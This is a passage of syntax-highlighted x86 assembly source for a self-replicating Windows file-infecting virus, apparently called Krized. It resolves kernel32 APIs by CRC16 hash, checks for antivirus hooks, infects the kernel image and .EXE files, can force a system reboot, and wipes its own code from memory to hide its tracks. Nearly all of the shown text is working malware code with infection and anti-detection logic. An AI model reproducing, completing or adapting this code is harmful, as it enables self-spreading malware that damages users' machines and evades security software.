</span><span class="sc5">Found_K32_Base</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">K32_Base</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">     </span><span class="sc1">; Store K32-base.</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">EBX.Image_Size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">K32_Image_Size</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+</span><span class="sc2">120</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; K32's export-table.</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">        </span><span class="sc1">; Array of API-name RVA's.</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+(</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">        </span><span class="sc1">; Amount of API-name RVA's.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Fetched_API</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Hook_API_Count</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Work_API_Count</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Loop_Export</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+(</span><span class="sc8">EDX</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">      </span><span class="sc1">; Offset of API-name.</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">PUSHAD</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Save base-address in ECX.</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Calculate_CRC16</span><span class="sc0">         </span><span class="sc1">; Calculate the CRC16 of this</span><span class="sc0">
                        </span><span class="sc1">; API-name.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+(</span><span class="sc2">9</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">        </span><span class="sc1">; Array of API-ordinals.</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+(</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">        </span><span class="sc1">; Array of API-handler RVA's.</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc8">EDX</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+(</span><span class="sc8">EAX</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ECX</span><span class="sc4">+</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">; NAV 9x seems to fuck around with the K32 memory image setting it's own</span><span class="sc0">
</span><span class="sc1">; export hooks, for example CreateProcessA and WinExec. Anyways, Krized</span><span class="sc0">
</span><span class="sc1">; would use hardcoded hooked addresses, and the next boot everything goes</span><span class="sc0">
</span><span class="sc1">; bang cuz NAV ain't loaded yet. To test for hooked addresses we check if</span><span class="sc0">
</span><span class="sc1">; the address is in range of the K32-image, and abort infect if it's not.</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">K32_Image_Size</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">Rep_Loop_Name</span><span class="sc0">

        </span><span class="sc1">; Check if it's an API which we need.</span><span class="sc0">

        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Hook_API_CRC</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">Hook_API_Count</span><span class="sc4">+</span><span class="sc5">Work_API_Count</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">REPNE</span><span class="sc0">   </span><span class="sc6">SCASW</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Rep_Loop_Name</span><span class="sc0">

        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">

        </span><span class="sc1">; Save API-address.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">API_Addresses</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)+(</span><span class="sc8">EAX</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">

        </span><span class="sc1">; Got another one.</span><span class="sc0">

        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Fetched_API</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Hook_API_Count</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; Do we need to save this</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">Rep_Loop_Name</span><span class="sc0">           </span><span class="sc1">; API's export-address?</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Hook_Exports</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)+(</span><span class="sc8">EAX</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">

</span><span class="sc5">Rep_Loop_Name</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POPAD</span><span class="sc0">

        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc0">

        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Loop_Export</span><span class="sc0">

        </span><span class="sc6">JECXZ</span><span class="sc0">   </span><span class="sc5">@1</span><span class="sc0">

        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E9h</span><span class="sc0">

</span><span class="sc5">@1</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; We're all API's found?</span><span class="sc0">
</span><span class="sc5">Fetched_API</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Wipe_Memory</span><span class="sc0">             </span><span class="sc1">; Else abort further infect.</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">              </span><span class="sc1">; Request for kernel-infect.</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Infect_File</span><span class="sc0">

    </span><span class="sc1">; Try to cover-up as many tracks as possible by clearing</span><span class="sc0">
    </span><span class="sc1">; most of our code in memory, as we don't need it anymore.</span><span class="sc0">

</span><span class="sc5">Wipe_Memory</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Wipe_Memory</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">CLD</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">STOSB</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Infect_File</span><span class="sc4">-</span><span class="sc5">Wipe_Memory</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_End</span><span class="sc4">-</span><span class="sc5">Infect_File</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">STOSB</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; Should we perform a reboot?</span><span class="sc0">
</span><span class="sc5">ExitWindowsEx</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">JECXZ</span><span class="sc0">   </span><span class="sc5">Rest_Init_SEH</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">EWX_FORCE</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">EWX_REBOOT</span><span class="sc0"> </span><span class="sc1">; Force a system reboot.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc0">

</span><span class="sc5">Rest_Init_SEH</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Unhook our own SEH.</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">

</span><span class="sc5">Return_To_Host</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POPAD</span><span class="sc0">                           </span><span class="sc1">; Restore all registers.</span><span class="sc0">
        </span><span class="sc6">POPFD</span><span class="sc0">

        </span><span class="sc6">RET</span><span class="sc0">                             </span><span class="sc1">; Return to our host.</span><span class="sc0">



</span><span class="sc1">;-------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; ESI == 0FFFFFFFFh = Infect kernel.</span><span class="sc0">
</span><span class="sc1">; ESI != 0FFFFFFFFh = Infect file pointed by ESI.</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Infect_File</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSHAD</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Setup_Inf_SEH</span><span class="sc0">

        </span><span class="sc6">PUSHAD</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+(</span><span class="sc2">9</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">        </span><span class="sc1">; Grab exception-code off</span><span class="sc0">
        </span><span class="sc6">LODSD</span><span class="sc0">                           </span><span class="sc1">; the stack.</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Delta</span><span class="sc0">

        </span><span class="sc6">SHL</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">; Strip flags.</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">03h</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; Virus' request to call an</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Virus_Request</span><span class="sc0">           </span><span class="sc1">; API ?</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+(</span><span class="sc2">10</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">       </span><span class="sc1">; Unhandled exception, so</span><span class="sc0">
                        </span><span class="sc1">; abort further execution.</span><span class="sc0">
</span><span class="sc5">JMP_R_Inf_SEH</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Rest_Inf_SEH</span><span class="sc0">

</span><span class="sc5">Virus_Request</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+(</span><span class="sc2">11</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">       </span><span class="sc1">; Context-block.</span><span class="sc0">

        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Perform_API</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">+</span><span class="sc2">184</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">          </span><span class="sc1">; Swap EIP.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">+</span><span class="sc2">196</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; ESP.</span><span class="sc0">

</span><span class="sc1">; Win9x sets the exception-address with Exception_EIP + 1, whereas NT</span><span class="sc0">
</span><span class="sc1">; does the right thing and uses Exception_EIP, we need some extra</span><span class="sc0">
</span><span class="sc1">; code to keep this in account.</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc0">    </span><span class="sc1">; This is the breakpoint?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Swap_Address</span><span class="sc0">

        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Skip breakpoint.</span><span class="sc0">

</span><span class="sc5">Swap_Address</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ECX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">              </span><span class="sc1">; Swap index-number with</span><span class="sc0">
                        </span><span class="sc1">; Perform_API's address.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Work_API_Index</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

        </span><span class="sc6">POPAD</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Reload context and continue</span><span class="sc0">
                        </span><span class="sc1">; execution.</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">Setup_Inf_SEH</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">EBX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">EBX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc0">

    </span><span class="sc1">; The virtual-size entry of object-headers is not reliable,</span><span class="sc0">
    </span><span class="sc1">; therefore we need to allocate our memory by hand.</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">End_Heap</span><span class="sc4">-</span><span class="sc5">Virus_End</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Allocate memory on the</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">                     </span><span class="sc1">; global heap.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixGlobalAlloc</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Error?</span><span class="sc0">
        </span><span class="sc6">JECXZ</span><span class="sc0">   </span><span class="sc5">JMP_R_Inf_SEH</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Global_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Infect_Mode</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc0">

        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc0">                     </span><span class="sc1">; Request to infect K32 ?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Payload_Test</span><span class="sc0">

        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc0">                     </span><span class="sc1">; Some API can have NULL.</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">JMP_Free_Glo_M</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Infect_Mode</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Open_Candidate</span><span class="sc4">-</span><span class="sc5">Infect_Mode</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Zero EAX.</span><span class="sc0">

        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ECX</span><span class="sc4">+(</span><span class="sc5">ANSI_Target_File</span><span class="sc4">-</span><span class="sc5">Virus_End</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">

        </span><span class="sc6">CLD</span><span class="sc0">

</span><span class="sc5">Convert_Path</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">LODSB</span><span class="sc0">                           </span><span class="sc1">; Fetch next byte/word.</span><span class="sc0">
        </span><span class="sc6">NOP</span><span class="sc0">
</span><span class="sc5">Unicode_Switch</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">                  </span><span class="sc1">; Is it non-ASCII  ?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">JMP_Free_Glo_M</span><span class="sc0">          </span><span class="sc1">; Then abort infect.</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Store_Upcase</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'z'</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">Store_Upcase</span><span class="sc0">

        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">           </span><span class="sc1">; Convert to uppercase.</span><span class="sc0">
</span><span class="sc5">Store_Upcase</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">STOSB</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Init_Find_Name</span><span class="sc0">

        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Convert_Path</span><span class="sc0">

</span><span class="sc5">JMP_Free_Glo_M</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Free_Global_M</span><span class="sc0">

</span><span class="sc5">Init_Find_Name</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">

</span><span class="sc5">Find_File_Name</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">                </span><span class="sc1">; Reached the beginning?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Check_File_Ext</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc13">'\'   ; Found start filename?
</span><span class="sc0">        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Find_File_Name</span><span class="sc0">

</span><span class="sc5">Check_File_Ext</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EXE.'</span><span class="sc0">         </span><span class="sc1">; Standard .EXE-file?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Calc_CRC_Name</span><span class="sc0">

